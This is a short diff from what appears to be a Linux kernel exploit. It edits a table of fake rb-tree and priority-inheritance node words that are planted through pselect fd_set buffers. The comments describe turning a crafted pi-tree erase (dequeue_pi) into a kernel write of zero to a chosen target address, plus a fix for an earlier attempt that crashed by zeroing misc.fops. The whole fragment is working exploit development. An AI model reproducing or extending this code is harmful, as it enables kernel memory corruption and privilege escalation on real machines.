@@ -1788,15 +1788,17 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           {0, tree_pc, "tree_pc"},
           {1, tree_r, "tree_right"},
           {2, tree_l, "tree_left"},
-          {3, 0, "pi_parent"},
-          {4, 0, "pi_right"},
-          /* DATAONLY: pi_left = write target. The stack pi-tree erase
-           * (dequeue_pi) with parent_color=0 (VALUE, red) and one left
-           * child executes child->__rb_parent_color = pc -> *target=0.
-           * pi_parent/pi_right stay 0 (= the value + no right child). */
-          {5, env_flag("MODE4_DATAONLY", 0)
-                   ? (uint64_t)pselect_write_target()
-                   : 0,
+          /* pi words must emit the STAMP's values: the 09-13 fire-5
+           * pi-only swap crashed because pi_parent was hardcoded 0 —
+           * the pi erase ran parent=NULL and ZEROED misc.fops. Emit all
+           * three pi words from the stamp locals (DATAONLY keeps its
+           * target in pi_left via pselect_write_target as before). */
+          {3, pi_parent, "pi_parent"},
+          {4, pi_right, "pi_right"},
+          {5, (pi_parent || pi_right) ? pi_left
+                   : (env_flag("MODE4_DATAONLY", 0)
+                          ? (uint64_t)pselect_write_target()
+                          : 0),
            "pi_left"},
           {6, stack_task, "task"},
           {7, stack_lock, "lock"},
